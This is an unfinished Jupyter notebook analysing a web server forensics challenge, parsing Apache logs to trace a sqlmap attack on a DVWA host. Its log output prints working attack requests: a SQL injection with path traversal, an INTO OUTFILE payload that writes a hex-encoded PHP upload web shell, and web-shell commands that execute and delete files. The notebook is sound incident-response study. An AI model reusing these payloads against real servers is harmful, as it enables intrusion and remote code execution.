{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "cellular-disabled",
   "metadata": {},
   "source": [
    "# Web Server Case : Ali Hadi"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "revolutionary-entity",
   "metadata": {},
   "source": [
    "**Source:** https://www.ashemery.com/dfir.html\n",
    "\n",
    "**To successfully solve this challenge, a report with answers to the tasks below is required:**\n",
    "\n",
    "    * What type of attacks has been performed on the box?\n",
    "    * How many users has the attacker(s) added to the box, and how were they added?\n",
    "    * What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks)\n",
    "    * What software has been installed on the box, and were they installed by the attacker(s) or not?\n",
    "    * Using memory forensics, can you identify the type of shellcode used?\n",
    "    * What is the timeline analysis for all events that happened on the box?\n",
    "    * What is your hypothesis for the case, and what is your approach in solving it?\n",
    "    * Is there anything else you would like to add?\n",
    "\n",
    "**Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "theoretical-caution",
   "metadata": {},
   "source": [
    "**Evidences:**\n",
    "* System Image: s4a-challenge4\n",
    "* System Memory: memdump.mem"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "outer-counter",
   "metadata": {},
   "source": [
    "# 1º Extract artifacts from evidences"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "welsh-authentication",
   "metadata": {},
   "source": [
    "With FTK Imager mount the s4a-challenge4 evidence to see the filesystem and identify what is a windows webserver (LAMP).\n",
    "\n",
    "Get the logs of webserver from c:\\xampp\\apache\\logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "accurate-favorite",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Installing Apache HTTP Server 2.x with\n",
      " DomainName    = example.com\n",
      " ServerName    = www.example.com\n",
      " ServerAdmin   = admin@example.com\n",
      " ServerPort    = 80\n",
      " ServerSslPort = 443\n",
      " ServerRoot    = c:/Apache24\n"
     ]
    }
   ],
   "source": [
    "!cat logs/install.log | head -7"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ranking-mobility",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   4398 192.168.56.102\n",
      "    461 10.20.0.72\n",
      "    316 10.20.0.54\n",
      "    302 10.20.0.65\n",
      "    301 10.20.0.61\n",
      "    301 10.20.0.58\n",
      "    300 10.20.0.68\n",
      "    300 10.20.0.66\n",
      "    300 10.20.0.63\n",
      "    300 10.20.0.62\n",
      "    139 10.20.0.75\n",
      "    139 10.20.0.71\n",
      "    124 ::1\n",
      "     26 10.20.0.90\n",
      "      9 10.20.0.109\n"
     ]
    }
   ],
   "source": [
    "!cat logs/access.log | awk '{print $1}' | sort | uniq -c | sort -nr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "thousand-framing",
   "metadata": {},
   "outputs": [],
   "source": [
    "!grep \"192.168.56.102\" logs/access.log >> 192-168-56-102-access_log.log"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "federal-pizza",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   3621 sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\n",
      "    510 Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n",
      "    215 Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0\n",
      "     28 Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.4.0\n",
      "     22 Mozilla/4.0 (compatible; MSIE 6.0;)\n",
      "      6 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)\n",
      "      2 Python-urllib/2.7\n"
     ]
    }
   ],
   "source": [
    "!cat 192-168-56-102-access_log.log | awk -F\\\" '{print $6}' | sort | uniq -c | sort -nr"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "level-pepper",
   "metadata": {},
   "source": [
    "## Exploit Public-Facing Application (T1190)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "suspended-conversation",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20%5Cxampp%5Chtdocs%5Ctmpbiwuc.php HTTP/1.1\n",
      "GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1\n",
      "GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit&ZSce%3D8435%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2C2%2C3%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%20..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\n",
      "GET /dvwa/vulnerabilities/sqli/?id=2%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fxampp%2Fhtdocs%2Ftmpudvfh.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20--%20&Submit=Submit HTTP/1.1\n",
      "GET /xampp/htdocs/tmpudvfh.php HTTP/1.1\n",
      "GET /htdocs/tmpudvfh.php HTTP/1.1\n",
      "GET /tmpudvfh.php HTTP/1.1\n",
      "GET /tmpbrjvl.php?cmd=echo%20command%20execution%20test HTTP/1.1\n",
      "GET /tmpbrjvl.php?cmd=del%20%2FF%20%2FQ%20C%3A%5Cxampp%5Chtdocs%5Ctmpudvfh.php HTTP/1.1\n",
      "GET /tmpbrjvl.php?cmd=del%20%2FF%20%2FQ%20%5Cxampp%5Chtdocs%5Ctmpbrjvl.php HTTP/1.1\n"
     ]
    }
   ],
   "source": [
    "!cat 192-168-56-102-access_log.log | grep \"sqlmap/1.0-dev-nongit-20150902\" | awk -F\\\" '{print $2}' | tail -n10\n",
    "# files has being created and deleted..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "confirmed-campaign",
   "metadata": {},
   "outputs": [],
   "source": [
    "# XSS Vulnerabilities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "allied-forest",
   "metadata": {},
   "outputs": [],
   "source": [
    "# upload vulnerabilities (php web shells)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "floral-trick",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
